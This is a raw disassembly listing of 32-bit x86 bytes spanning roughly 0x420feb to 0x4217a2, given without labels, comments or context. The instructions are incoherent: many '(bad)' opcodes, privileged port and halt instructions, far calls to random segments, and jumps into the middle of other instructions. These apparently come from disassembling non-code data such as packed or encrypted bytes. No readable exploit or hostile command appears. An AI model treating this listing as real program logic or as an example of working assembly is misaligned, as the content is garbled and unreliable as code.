  420feb:	sub    BYTE PTR [eax+0x562bc9d7],ch
  420ff1:	fist   DWORD PTR [ebp+0x1bc0807f]
  420ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ff8:	mov    ebp,0x103a12fc
  420ffd:	hlt    
  420ffe:	pusha  
  420fff:	out    dx,eax
  421000:	mov    DWORD PTR [eax-0x7321d156],ebx
  421006:	adc    eax,0xe1f2cec7
  42100b:	out    dx,al
  42100c:	inc    esi
  42100d:	or     al,BYTE PTR [ecx]
  42100f:	out    dx,eax
  421010:	stos   BYTE PTR es:[edi],al
  421011:	adc    esi,DWORD PTR [eax+0x182affde]
  421017:	sbb    eax,0xe34d819f
  42101c:	in     al,0x86
  42101e:	addr16 cld 
  421020:	mov    cl,0xfb
  421022:	fs (bad) 
  421024:	sub    al,0xa4
  421026:	mov    cl,0x58
  421028:	push   ds
  421029:	(bad)  
  42102a:	and    ebx,ecx
  42102c:	fucomi st,st(0)
  42102e:	push   edx
  42102f:	aaa    
  421030:	lods   eax,DWORD PTR ds:[esi]
  421031:	push   cs
  421032:	jb     0x421011
  421034:	xchg   DWORD PTR [ebx],esi
  421036:	jne    0x421009
  421038:	mov    edx,0x2339c936
  42103d:	and    ch,BYTE PTR [edx]
  42103f:	inc    esp
  421040:	push   edx
  421041:	pop    es
  421042:	push   ds
  421043:	sub    eax,DWORD PTR [esi+0x4cd19185]
  421049:	(bad)  
  42104a:	cmc    
  42104b:	or     ebx,DWORD PTR [edi]
  42104d:	mov    ?,ebp
  42104f:	jbe    0x421005
  421051:	sub    edi,DWORD PTR [ebp-0x6e52d07b]
  421057:	add    esp,ecx
  421059:	jecxz  0x4210b0
  42105b:	retf   0x18ab
  42105e:	cmp    edi,edx
  421060:	ss ins BYTE PTR es:[edi],dx
  421062:	and    ebp,DWORD PTR [edi-0x12cf1df5]
  421068:	cld    
  421069:	dec    esi
  42106a:	pop    esp
  42106b:	retf   0xa202
  42106e:	fmul   st,st(2)
  421070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421071:	ss xchg edi,eax
  421073:	pusha  
  421074:	int    0x3d
  421076:	or     dl,bh
  421078:	cld    
  421079:	jne    0x4210c2
  42107b:	sahf   
  42107c:	jmp    0x421001
  42107e:	mov    BYTE PTR [esi],al
  421080:	push   esi
  421081:	pop    edi
  421082:	lock inc esi
  421084:	jno    0x4210ca
  421086:	push   ss
  421087:	jno    0x42104c
  421089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42108a:	addr16 adc al,0xe9
  42108d:	cmp    eax,0x4221ebd
  421092:	cs (bad) 
  421094:	jae    0x421086
  421096:	push   ds
  421097:	out    dx,eax
  421098:	xor    eax,0x24878287
  42109d:	cmp    al,0x9
  42109f:	xlat   BYTE PTR ds:[ebx]
  4210a0:	inc    ebp
  4210a1:	cli    
  4210a2:	iret   
  4210a3:	mov    cl,0xda
  4210a5:	and    eax,0x35f3ba4
  4210aa:	into   
  4210ab:	push   edx
  4210ac:	inc    ebx
  4210ad:	in     eax,0xda
  4210af:	cmp    eax,0x2c6088fc
  4210b4:	daa    
  4210b5:	repz jle 0x42103f
  4210b8:	jnp    0x421072
  4210ba:	je     0x421047
  4210bc:	(bad)  
  4210bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210be:	inc    esp
  4210bf:	or     BYTE PTR [eax],cl
  4210c1:	adc    bl,BYTE PTR [ebx]
  4210c3:	inc    edi
  4210c4:	ds hlt 
  4210c6:	mov    eax,ds:0xa2ddc80b
  4210cb:	stos   BYTE PTR es:[edi],al
  4210cc:	aad    0xca
  4210ce:	aas    
  4210cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210d0:	mov    ch,0xc1
  4210d2:	sbb    ebx,DWORD PTR cs:[eax-0x57]
  4210d6:	in     eax,dx
  4210d7:	pop    edx
  4210d8:	mov    BYTE PTR [ebp-0x37],dh
  4210db:	mov    ds:0x938aabe8,eax
  4210e0:	inc    edi
  4210e1:	mov    dl,BYTE PTR [ebp+0x4e]
  4210e4:	push   ds
  4210e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210e6:	into   
  4210e7:	mov    WORD PTR [esi],ds
  4210e9:	retf   0xee84
  4210ec:	push   cs
  4210ed:	mov    esp,0x1ee5d900
  4210f2:	jno    0x421136
  4210f4:	mov    bh,0xb1
  4210f6:	ja     0x421095
  4210f8:	ret    
  4210f9:	sar    BYTE PTR [ebp-0x66],cl
  4210fc:	sub    al,0x72
  4210fe:	std    
  4210ff:	sbb    DWORD PTR [ecx+0x32],ebx
  421102:	inc    ebx
  421103:	xchg   ebx,eax
  421104:	jle    0x421148
  421106:	cdq    
  421107:	das    
  421108:	out    0xf1,al
  42110a:	faddp  st(6),st
  42110c:	and    ch,ch
  42110e:	add    ecx,DWORD PTR [esi]
  421110:	mov    ecx,0x8d1fbe7d
  421115:	inc    edi
  421116:	pop    ebp
  421117:	xchg   ebx,eax
  421118:	mov    BYTE PTR [edx],dl
  42111a:	ja     0x42115c
  42111c:	aaa    
  42111d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42111e:	popf   
  42111f:	std    
  421120:	les    ebp,FWORD PTR [eax+0x24827e7c]
  421126:	ds pop ebx
  421128:	retf   0x8768
  42112b:	cli    
  42112c:	jecxz  0x42115f
  42112e:	retf   
  42112f:	cdq    
  421130:	in     eax,dx
  421131:	aaa    
  421132:	push   esi
  421133:	call   0x49e2:0x4837d0ea
  42113a:	add    ecx,DWORD PTR [eax+edi*2]
  42113d:	int    0xec
  42113f:	push   edi
  421141:	pop    ds
  421142:	cdq    
  421143:	inc    eax
  421144:	sbb    eax,0xc51bd736
  421149:	add    esi,DWORD PTR [esi+0x64]
  42114c:	into   
  42114d:	div    ah
  42114f:	pop    esi
  421150:	xor    al,0xf7
  421152:	iret   
  421153:	push   ds
  421154:	jne    0x421174
  421156:	dec    esi
  421157:	push   ss
  421158:	ret    
  421159:	(bad)  
  42115a:	pop    ecx
  42115b:	retf   0x5e04
  42115e:	sahf   
  42115f:	adc    ah,0xb7
  421162:	dec    esi
  421163:	fdivr  DWORD PTR [esi+0x62543ea3]
  421169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42116a:	dec    ecx
  42116b:	test   al,0xd8
  42116d:	adc    edi,DWORD PTR [eax-0x49]
  421170:	sbb    ecx,DWORD PTR [edi]
  421172:	mov    eax,0xc5f223d
  421177:	stos   BYTE PTR es:[edi],al
  421178:	pushf  
  421179:	into   
  42117a:	mov    al,0xdf
  42117c:	les    edi,FWORD PTR [edi-0x909dc15]
  421182:	xchg   ecx,eax
  421183:	lahf   
  421184:	mov    WORD PTR [edi+0x7d],?
  421187:	je     0x421159
  421189:	dec    ebx
  42118a:	(bad)  
  42118c:	fwait
  42118d:	ror    BYTE PTR [ecx-0x66bbd5a0],1
  421193:	mov    eax,ds:0xb417f8cc
  421198:	and    eax,0xe6fb9ce6
  42119d:	sbb    bh,BYTE PTR [edx+0x202af56b]
  4211a3:	sbb    BYTE PTR [edx+0x48],0xf7
  4211a7:	cmp    eax,0x404d61ee
  4211ac:	adc    edx,DWORD PTR [esi+0x40]
  4211af:	xor    al,0xd6
  4211b1:	push   esp
  4211b2:	fs icebp 
  4211b4:	dec    eax
  4211b5:	call   0xa304627f
  4211ba:	and    eax,0xad55e75a
  4211bf:	lods   eax,DWORD PTR ds:[esi]
  4211c0:	in     eax,dx
  4211c1:	pop    esp
  4211c2:	js     0x4211ad
  4211c4:	mov    ebx,0x3dd16033
  4211c9:	lods   eax,DWORD PTR ds:[esi]
  4211ca:	xchg   edx,eax
  4211cb:	sub    eax,0x9057b0d
  4211d0:	dec    esi
  4211d1:	sbb    ebp,eax
  4211d3:	aaa    
  4211d4:	pop    es
  4211d5:	ss or  al,0xf2
  4211d8:	inc    esi
  4211d9:	test   DWORD PTR [edx-0x55],eax
  4211dc:	mov    bh,0x1d
  4211de:	rol    BYTE PTR [ebx*2-0x4af78195],cl
  4211e5:	jbe    0x4211dd
  4211e7:	dec    ebx
  4211e8:	je     0x42120b
  4211ea:	sbb    al,0x63
  4211ec:	ss push eax
  4211ee:	das    
  4211ef:	mov    edi,ds
  4211f1:	xchg   ecx,eax
  4211f2:	stos   DWORD PTR es:[edi],eax
  4211f3:	sub    esi,DWORD PTR [ebp+edx*4-0x32]
  4211f7:	jp     0x421225
  4211f9:	xor    al,0x5a
  4211fb:	cmp    DWORD PTR [ebx+0x46],ebx
  4211fe:	fisttp DWORD PTR [ebx]
  421200:	and    al,0x7e
  421202:	mul    al
  421204:	xchg   ebx,eax
  421205:	or     al,0x82
  421207:	inc    eax
  421208:	(bad)  
  421209:	sub    al,0x9a
  42120b:	mov    bh,0x17
  42120d:	(bad)  
  42120f:	sti    
  421210:	mov    ss,WORD PTR [eax]
  421212:	mov    al,0x3d
  421214:	imul   edx,edi,0x6c88ca19
  42121a:	out    dx,al
  42121b:	fcmovnbe st,st(3)
  42121d:	push   cs
  42121e:	in     al,0xae
  421220:	enter  0x1d34,0xdc
  421224:	hlt    
  421225:	inc    edx
  421226:	push   ecx
  421227:	test   BYTE PTR [ebp+0x2d],0xde
  42122b:	push   ds
  42122c:	or     ecx,DWORD PTR [ecx+0x6eea31d2]
  421232:	mov    edi,0x8512b370
  421237:	add    bh,BYTE PTR [edi+0x4e]
  42123a:	dec    ebp
  42123b:	sub    eax,0xf064a296
  421240:	xchg   ebx,eax
  421241:	xchg   DWORD PTR [esi+0x22de839e],eax
  421247:	jge    0x4211f2
  421249:	repz fcom DWORD PTR [edx]
  42124c:	aam    0xc5
  42124e:	sar    BYTE PTR [ecx-0x7c],1
  421251:	inc    edi
  421252:	(bad)
  421255:	cmp    ebx,ecx
  421257:	(bad)  
  421258:	loope  0x421255
  42125a:	mov    al,0x89
  42125c:	and    al,0x70
  42125e:	inc    ecx
  42125f:	out    dx,eax
  421260:	sub    al,0xbe
  421262:	bound  esi,QWORD PTR [ebp-0x34d3a5e2]
  421268:	(bad)  
  421269:	shl    BYTE PTR [ecx-0x23],1
  42126c:	call   0xe1c7:0xc775c6ad
  421273:	and    edx,DWORD PTR [ecx+edx*4-0x41]
  421277:	(bad)
  42127c:	(bad)  
  42127d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42127e:	(bad)  [ebp+0x8c7402f]
  421284:	fcom   DWORD PTR [esi+0x7b]
  421287:	push   ebp
  421288:	mov    esp,0xf623d614
  42128d:	jge    0x4212d9
  42128f:	mov    edi,0x956e0aed
  421294:	outs   dx,BYTE PTR ds:[esi]
  421295:	adc    dl,bl
  421297:	add    BYTE PTR [ebx+eax*4-0x1],ah
  42129b:	xchg   ebx,eax
  42129c:	push   es
  42129d:	outs   dx,BYTE PTR ds:[esi]
  42129e:	mov    ds:0xfeeb1e09,eax
  4212a3:	xchg   ebp,eax
  4212a4:	cmp    eax,0x85f45d33
  4212a9:	sub    esi,DWORD PTR [edx-0x18f6b0a6]
  4212af:	test   edx,ecx
  4212b1:	arpl   WORD PTR [edi+0x4b],sp
  4212b4:	pop    edi
  4212b5:	jae    0x4212a2
  4212b7:	test   al,0xfc
  4212b9:	mov    ah,al
  4212bb:	jno    0x4212fd
  4212bd:	or     dl,BYTE PTR [edx+0x16003c8b]
  4212c3:	jne    0x4212e6
  4212c5:	bound  esi,QWORD PTR [edx]
  4212c7:	call   0xb7df:0xc65fdae7
  4212ce:	pop    eax
  4212cf:	mov    ecx,es
  4212d1:	dec    ebp
  4212d2:	ds jae 0x421339
  4212d5:	out    0x43,al
  4212d7:	xchg   ecx,eax
  4212d8:	scas   al,BYTE PTR es:[edi]
  4212d9:	adc    ch,ah
  4212db:	ret    
  4212dc:	idiv   DWORD PTR [ebp+0x21]
  4212df:	cs aad 0xa0
  4212e2:	pop    es
  4212e3:	push   0xdca05040
  4212e8:	mov    ebp,fs
  4212ea:	cmp    bh,BYTE PTR [ebx-0x20d78b6b]
  4212f0:	sti    
  4212f1:	push   esi
  4212f2:	int    0x40
  4212f4:	jle    0x421320
  4212f6:	inc    eax
  4212f7:	add    eax,0xd7683e79
  4212fc:	clc    
  4212fd:	mul    BYTE PTR [ecx+0x265feeab]
  421303:	cmp    DWORD PTR [edx-0x2e],eax
  421306:	int3   
  421307:	in     eax,dx
  421308:	cwde   
  421309:	add    ebp,DWORD PTR [edi+0x4704f8d0]
  42130f:	xchg   ebp,eax
  421310:	cmc    
  421311:	sub    al,0xa6
  421313:	mov    ebx,0x3c88e5e2
  421318:	or     esi,DWORD PTR [esi+0x1f]
  42131b:	push   esp
  42131c:	mov    ds,WORD PTR [ebx+ebx*8+0x4a70abff]
  421323:	pop    eax
  421324:	or     eax,0x74083483
  421329:	cwde   
  42132a:	adc    ch,ah
  42132c:	sub    esi,ebx
  42132e:	mov    dl,0x92
  421330:	mov    bh,0xe6
  421332:	xor    DWORD PTR [ebp+ebp*1+0x560a2ed5],edx
  421339:	or     esi,DWORD PTR [edx]
  42133b:	pop    esi
  42133c:	loopne 0x4212cf
  42133e:	scas   al,BYTE PTR es:[edi]
  42133f:	imul   ecx,DWORD PTR [edx+0x605deff9],0x9791ca3d
  421349:	fisub  WORD PTR [ebx+0x75fac192]
  42134f:	sar    BYTE PTR [ecx-0x1b],cl
  421352:	jne    0x421304
  421354:	cli    
  421355:	imul   eax,DWORD PTR [ecx+0x19],0x4f51c9ad
  42135c:	adc    esp,ebx
  42135e:	ins    BYTE PTR es:[di],dx
  421360:	mov    ebp,0x9bcec35f
  421365:	mov    cl,0x3
  421367:	out    0x2d,al
  421369:	repz jns 0x421392
  42136c:	in     eax,0x14
  42136e:	stos   BYTE PTR es:[edi],al
  42136f:	lods   al,BYTE PTR ds:[esi]
  421370:	or     DWORD PTR [esi-0x69d05f5a],edx
  421376:	cmc    
  421377:	ret    0x8ac7
  42137a:	fsub   st,st(7)
  42137c:	sbb    DWORD PTR [esp+esi*2],0x4623ada6
  421383:	enter  0x55ac,0x6f
  421387:	or     al,0x2e
  421389:	or     ah,BYTE PTR [eax-0x44ea926b]
  42138f:	push   ebp
  421390:	jge    0x4213ca
  421392:	cmp    dh,BYTE PTR [esi]
  421394:	and    BYTE PTR [edx],dh
  421396:	mov    ecx,0xd5d93f6d
  42139b:	fdiv   st,st(7)
  42139d:	ret    
  42139e:	popa   
  42139f:	mov    dl,0x21
  4213a1:	dec    eax
  4213a2:	inc    esp
  4213a3:	pop    ecx
  4213a4:	stc    
  4213a5:	sbb    edx,DWORD PTR [edx-0x29108083]
  4213ab:	jmp    0x42141d
  4213ad:	mov    ecx,0x8ce58d15
  4213b2:	sahf   
  4213b3:	dec    esp
  4213b4:	cmp    al,0xf1
  4213b6:	call   0xdcb545c9
  4213bb:	pop    ecx
  4213bc:	lahf   
  4213bd:	add    ebp,DWORD PTR [ebx+0x78ac73be]
  4213c3:	sub    al,dh
  4213c5:	shl    al,cl
  4213c7:	retf   0x99e2
  4213ca:	push   0x12
  4213cc:	stos   DWORD PTR es:[edi],eax
  4213cd:	loop   0x4213aa
  4213cf:	dec    edi
  4213d0:	loop   0x42137e
  4213d2:	sti    
  4213d3:	das    
  4213d4:	aas    
  4213d5:	fsubr  DWORD PTR [ebp+0x19]
  4213d8:	rol    DWORD PTR [eax+0x77ca1f72],0x1f
  4213df:	cmp    al,ch
  4213e1:	ret    0x3543
  4213e4:	xchg   ecx,eax
  4213e5:	jmp    0x4213b9
  4213e7:	ficomp DWORD PTR [ebx]
  4213e9:	or     ah,BYTE PTR [esi-0x4e]
  4213ec:	retf   
  4213ed:	xor    al,0x21
  4213ef:	mov    ch,0xfd
  4213f1:	aam    0x41
  4213f3:	ja     0x4213bf
  4213f5:	dec    esi
  4213f6:	mov    al,ds:0x202669e0
  4213fb:	dec    edx
  4213fc:	pop    edx
  4213fd:	out    dx,eax
  4213fe:	popf   
  4213ff:	(bad)  
  421400:	mov    edi,DWORD PTR [ebp-0x4]
  421403:	xor    edx,eax
  421405:	jmp    0x421917
  42140a:	rcl    edx,1
  42140c:	(bad)  
  42140d:	leave  
  42140e:	aad    0xc9
  421410:	rcr    edx,1
  421412:	or     eax,0xec072fb9
  421417:	cmp    BYTE PTR [ebx],cl
  421419:	add    DWORD PTR [esi+0x6a],edi
  42141c:	jg     0x421496
  42141e:	jae    0x42149c
  421420:	js     0x42149a
  421422:	pop    ss
  421423:	jp     0x421438
  421425:	call   0x438e0946
  42142a:	out    0xea,al
  42142c:	imul   edi,DWORD PTR [edi+0x73bc382b],0x9b9ee329
  421436:	cmp    eax,0x5da82d89
  42143b:	test   DWORD PTR [ebp-0x71],0x6b1b064a
  421442:	jle    0x421490
  421444:	es jmp 0x4214bc
  421447:	lea    ebp,[edx+0x786d57c1]
  42144d:	inc    edx
  42144e:	imul   esi,edx,0x40
  421451:	arpl   WORD PTR [edi+0x32d9c717],bp
  421457:	cld    
  421458:	jns    0x4214ca
  42145a:	aad    0x6a
  42145c:	dec    eax
  42145d:	cmp    ch,dl
  42145f:	mov    edx,0xff20eb47
  421464:	cmp    DWORD PTR [ecx+0x6218a482],edi
  42146a:	dec    ebp
  42146b:	jae    0x4214b6
  42146d:	push   esp
  42146e:	xchg   edi,eax
  42146f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421470:	adc    eax,0xdefeeb56
  421475:	pop    eax
  421476:	jo     0x4214eb
  421478:	scas   eax,DWORD PTR es:[edi]
  421479:	mov    esp,0x4eab5bae
  42147e:	in     al,dx
  42147f:	mov    cl,0x1d
  421481:	adc    ebx,DWORD PTR [edx+0x4a962eda]
  421487:	mov    BYTE PTR [edi+0x576926bd],ch
  42148d:	hlt    
  42148e:	xchg   esp,eax
  42148f:	dec    ebx
  421490:	pop    esp
  421491:	scas   al,BYTE PTR es:[edi]
  421492:	mov    ds:0x599f45f6,al
  421497:	jl     0x421452
  421499:	adc    al,ch
  42149b:	int3   
  42149c:	nop
  42149d:	xchg   edx,eax
  42149e:	or     eax,DWORD PTR [edx]
  4214a0:	shr    DWORD PTR [esi-0x1],0xee
  4214a4:	stos   BYTE PTR es:[edi],al
  4214a5:	daa    
  4214a6:	lods   al,BYTE PTR ds:[esi]
  4214a7:	sub    eax,0x4e09ee7d
  4214ac:	cmp    al,0xe8
  4214ae:	imul   ecx,edx,0xe4770956
  4214b4:	and    al,0x1a
  4214b6:	(bad)  
  4214b7:	popa   
  4214b8:	xchg   ebx,eax
  4214b9:	mov    ecx,0xe0693f8b
  4214be:	push   ebx
  4214bf:	(bad)  
  4214c0:	sub    al,0x86
  4214c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214c3:	daa    
  4214c4:	and    DWORD PTR [esi],0xdf97193b
  4214ca:	xor    al,0x24
  4214cc:	jae    0x421525
  4214ce:	dec    ecx
  4214cf:	xchg   esp,eax
  4214d0:	popa   
  4214d1:	push   esi
  4214d2:	mov    dl,0xec
  4214d4:	pop    esp
  4214d5:	rol    BYTE PTR [ebp+0x741e7bed],0xeb
  4214dc:	pop    ebx
  4214dd:	mov    bl,0x57
  4214df:	sahf   
  4214e0:	xchg   edi,eax
  4214e1:	scas   eax,DWORD PTR es:[edi]
  4214e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214e3:	mov    dh,0x0
  4214e5:	(bad)  
  4214e7:	mov    al,ds:0x7c7bab49
  4214ec:	in     eax,0x9d
  4214ee:	pop    ebx
  4214ef:	into   
  4214f0:	popa   
  4214f1:	sbb    BYTE PTR [eax+0x64],0x93
  4214f5:	idiv   DWORD PTR [ebx-0x2bd6b51b]
  4214fb:	inc    edx
  4214fc:	outs   dx,BYTE PTR ds:[esi]
  4214fd:	bound  esp,QWORD PTR [edx-0x23440955]
  421503:	dec    esi
  421504:	sbb    BYTE PTR [esi],ah
  421506:	repz mov ebx,0x1250e10e
  42150c:	iret   
  42150d:	jno    0x4214ce
  42150f:	ret    
  421510:	retf   0x4d10
  421513:	shl    DWORD PTR [edi-0x3d6f725a],1
  421519:	xchg   esp,eax
  42151a:	add    eax,0xfef3438a
  42151f:	push   ss
  421520:	cmp    cl,bl
  421522:	daa    
  421523:	and    BYTE PTR [ecx+0x35ae19af],cl
  421529:	stc    
  42152a:	into   
  42152b:	imul   esi,DWORD PTR [ecx+0x5d],0x690bf482
  421532:	dec    ecx
  421533:	jmp    0xdfc08404
  421538:	cmp    BYTE PTR [ebp+0x58],dh
  42153b:	xchg   ebx,eax
  42153c:	jnp    0x42153b
  42153e:	push   ss
  42153f:	inc    edi
  421540:	int    0xac
  421542:	add    ah,BYTE PTR [edx]
  421544:	adc    DWORD PTR [edi-0xc],ecx
  421547:	loopne 0x421555
  421549:	lods   al,BYTE PTR ds:[esi]
  42154a:	out    0x36,al
  42154c:	jmp    0xe6d3:0x678334b9
  421553:	mov    ch,0x93
  421555:	push   esi
  421556:	sbb    bl,BYTE PTR [edi-0x57566665]
  42155c:	jb     0x421532
  42155e:	pop    ebx
  42155f:	add    DWORD PTR [edx],esi
  421561:	rol    ebx,0xbf
  421564:	sub    esp,DWORD PTR [esi]
  421566:	mov    eax,ds:0x3f28f8e2
  42156b:	int    0x55
  42156d:	xor    dh,BYTE PTR [edx]
  42156f:	fcom   DWORD PTR [ecx-0x1bc0d41e]
  421575:	sbb    bh,BYTE PTR ds:0x674f1290
  42157b:	cmp    al,0x75
  42157d:	and    esi,edx
  42157f:	shl    DWORD PTR [ebx],1
  421581:	add    BYTE PTR [ecx-0x7a],dh
  421584:	psrlw  mm3,0xf9
  421588:	mov    bh,BYTE PTR [ebx-0x320b13a4]
  42158e:	mov    ch,0xd8
  421590:	jbe    0x421532
  421592:	sbb    eax,0x8d98466c
  421597:	loopne 0x421545
  421599:	dec    ebx
  42159a:	jo     0x421580
  42159c:	cmc    
  42159d:	aad    0xb
  42159f:	int3   
  4215a0:	sbb    eax,ebp
  4215a2:	sub    eax,0x8c36421b
  4215a7:	jo     0x4215f3
  4215a9:	or     edx,DWORD PTR [ecx]
  4215ab:	popa   
  4215ac:	dec    ebx
  4215ad:	dec    ebx
  4215ae:	ret    0xd240
  4215b1:	(bad)
  4215b4:	or     BYTE PTR [esi-0x35],dh
  4215b7:	sar    edi,0xef
  4215ba:	adc    dl,BYTE PTR [edi+0x383e1bf1]
  4215c0:	push   cs
  4215c1:	call   0xbc618ac3
  4215c6:	mov    ebx,ebp
  4215c8:	fbld   TBYTE PTR [bx-0x70]
  4215cc:	pop    edx
  4215cd:	add    dl,BYTE PTR [ecx+0x1c5aaf42]
  4215d3:	imul   ebp,ebx,0xffffffcd
  4215d6:	arpl   cx,ax
  4215d8:	fnstsw WORD PTR [edi-0x62]
  4215db:	jne    0x42163f
  4215dd:	fisub  WORD PTR [esi+0x79d4b506]
  4215e3:	push   edx
  4215e4:	repnz clc 
  4215e6:	shl    DWORD PTR [edx],cl
  4215e8:	jb     0x42160a
  4215ea:	mov    dl,0x73
  4215ec:	inc    eax
  4215ed:	mov    bl,0xac
  4215ef:	and    BYTE PTR [edi+ecx*1-0x16],dh
  4215f3:	lods   al,BYTE PTR ds:[esi]
  4215f4:	cdq    
  4215f5:	lds    eax,FWORD PTR [ecx+0x7a693394]
  4215fb:	js     0x4215f8
  4215fd:	outs   dx,BYTE PTR ds:[esi]
  4215fe:	fisubr DWORD PTR [esi+0x58]
  421601:	sbb    dh,ch
  421603:	adc    al,0xf4
  421605:	pop    edi
  421606:	and    edi,DWORD PTR [ecx+ecx*2]
  421609:	or     al,0xdc
  42160b:	adc    DWORD PTR [ecx],esp
  42160d:	mov    bh,0x55
  42160f:	jecxz  0x4215e5
  421611:	enter  0xdfb1,0x6e
  421615:	fidivr WORD PTR [esp+ebx*1-0x65242dd8]
  42161c:	(bad)  
  42161d:	stc    
  42161e:	jnp    0x4215d9
  421620:	out    0x47,eax
  421622:	mov    ebx,0xe598f118
  421627:	sbb    edx,ebx
  421629:	dec    esi
  42162a:	aam    0xae
  42162c:	je     0x421695
  42162e:	mov    dh,0x31
  421630:	outs   dx,BYTE PTR ds:[esi]
  421631:	push   ecx
  421632:	xchg   edx,eax
  421633:	fcomip st,st(0)
  421635:	popa   
  421636:	add    ebx,DWORD PTR [esi+esi*8+0x70b45fab]
  42163d:	aad    0xa
  42163f:	scas   eax,DWORD PTR es:[edi]
  421640:	lods   eax,DWORD PTR ds:[esi]
  421641:	shl    BYTE PTR [edx-0x6d],1
  421644:	ins    BYTE PTR es:[edi],dx
  421645:	lods   eax,DWORD PTR ds:[esi]
  421646:	pop    ebp
  421647:	fisttp QWORD PTR [ecx+edx*8]
  42164a:	rcl    DWORD PTR cs:0x72b2f4b6,1
  421651:	cmp    edi,eax
  421653:	add    bh,BYTE PTR [ebx]
  421655:	mov    eax,esp
  421657:	inc    ebx
  421658:	add    ah,ah
  42165a:	ds rol ebp,cl
  42165d:	ror    DWORD PTR [edx+0x41],cl
  421660:	mov    cl,0x9
  421662:	xchg   esp,eax
  421663:	(bad)  
  421664:	cdq    
  421665:	adc    eax,0xdbf4c244
  42166a:	pop    ds
  42166b:	fistp  QWORD PTR [edi+0x1acb9439]
  421671:	mov    al,0xd1
  421673:	adc    al,BYTE PTR [edx-0x508a0e0d]
  421679:	(bad)  
  42167a:	das    
  42167b:	pop    esi
  42167c:	aas    
  42167d:	sahf   
  42167e:	ds gs push 0x1db7126
  421685:	test   al,0xac
  421687:	daa    
  421688:	iret   
  421689:	add    BYTE PTR [eax-0x1f340b30],al
  42168f:	xor    al,0x65
  421691:	xchg   DWORD PTR [ecx-0x38],esi
  421694:	cdq    
  421695:	imul   esp,esi,0xa3dda5ea
  42169b:	xchg   ebp,eax
  42169c:	add    DWORD PTR [edx+0x3d],0xffffffa7
  4216a0:	jbe    0x421717
  4216a2:	fimul  WORD PTR [ebp+0x8]
  4216a5:	shr    BYTE PTR [ecx+0x3e],1
  4216a8:	and    eax,0x5a222f44
  4216ad:	push   ds
  4216ae:	push   ds
  4216af:	dec    dx
  4216b1:	add    BYTE PTR [eax],al
  4216b3:	cs mov ebp,0xe1b649e4
  4216b9:	dec    edx
  4216ba:	inc    esi
  4216bb:	xchg   ebx,eax
  4216bc:	into   
  4216bd:	or     al,0xf6
  4216bf:	pop    ds
  4216c0:	imul   ebx,ecx,0x230ee468
  4216c6:	and    eax,0x9da7f865
  4216cb:	fsubr  DWORD PTR [ecx+0x198fe1f]
  4216d1:	aad    0x10
  4216d3:	int    0x8
  4216d5:	stc    
  4216d6:	cmp    bl,bh
  4216d8:	les    edi,FWORD PTR [ebp-0x5e]
  4216db:	inc    edx
  4216dc:	pop    ss
  4216dd:	jbe    0x4216c7
  4216df:	push   eax
  4216e0:	mov    edx,0xdc6a76f7
  4216e5:	leave  
  4216e6:	xor    ch,bl
  4216e8:	es jnp 0x4216f1
  4216eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216ed:	mov    ecx,0x90b1ed9b
  4216f2:	xchg   BYTE PTR [esi-0x18],dl
  4216f5:	data16 mov ch,0xb7
  4216f8:	jg     0x4216fc
  4216fa:	sar    esi,1
  4216fc:	dec    edi
  4216fd:	mov    ds:0x2e38cb9e,al
  421702:	mov    ds:0x568c7147,eax
  421707:	pop    ds
  421708:	pushf  
  421709:	je     0x42174e
  42170b:	and    cl,BYTE PTR [edi]
  42170d:	shr    dh,cl
  42170f:	out    0x34,al
  421711:	enter  0xf3f0,0x66
  421715:	xor    eax,0x8c757ebf
  42171a:	mov    esi,0xdb3531e9
  42171f:	inc    ebx
  421720:	or     eax,0x5b219aaa
  421725:	in     al,dx
  421726:	js     0x4217a7
  421728:	dec    ebp
  421729:	jg     0x4216bc
  42172b:	cmp    BYTE PTR [esi+0x2d],bh
  42172e:	jle    0xa05c5b7b
  421734:	jno    0x421739
  421736:	scas   eax,DWORD PTR es:[edi]
  421737:	out    dx,al
  421738:	push   esp
  421739:	mov    WORD PTR [ecx+0x4d],cs
  42173c:	clc    
  42173d:	pop    es
  42173e:	call   0xab9c:0x8494d42e
  421745:	mov    cl,ch
  421747:	adc    BYTE PTR [ebx+0x2a],0x7e
  42174b:	je     0x421706
  42174d:	sahf   
  42174e:	adc    ebx,DWORD PTR [eax+0x1d]
  421751:	xor    al,0xaa
  421753:	out    dx,eax
  421754:	sub    eax,0x8c15559f
  421759:	sub    DWORD PTR [esi],edi
  42175b:	push   0x409e8df8
  421760:	fdiv   DWORD PTR [edi]
  421762:	pop    ebx
  421763:	cmp    eax,0x5f4d4d3
  421768:	fist   DWORD PTR [ebx]
  42176a:	fwait
  42176b:	push   eax
  42176c:	nop
  42176d:	push   cs
  42176e:	add    BYTE PTR [edx],al
  421770:	icebp  
  421771:	iret   
  421772:	mov    dh,0x19
  421774:	pop    ebx
  421775:	sub    dh,BYTE PTR [eax]
  421777:	dec    ecx
  421778:	inc    eax
  421779:	mov    ah,BYTE PTR ds:0xbd636c8f
  42177f:	fidiv  WORD PTR [esi+eiz*2+0x1e]
  421783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421784:	push   eax
  421785:	mov    ds:0xa3879047,eax
  42178a:	pushf  
  42178b:	fld    st(5)
  42178d:	sbb    esi,DWORD PTR [edi+0x30]
  421790:	xchg   edx,eax
  421791:	fimul  WORD PTR [edx+0x7]
  421794:	clc    
  421795:	in     al,0xfb
  421797:	adc    al,0xe3
  421799:	fiadd  WORD PTR [ebx+edx*2+0xe]
  42179d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42179e:	inc    ecx
  42179f:	add    dl,BYTE PTR [edx]
  4217a1:	push   ebp
  4217a2:	mov    edx,0xf0e81cda
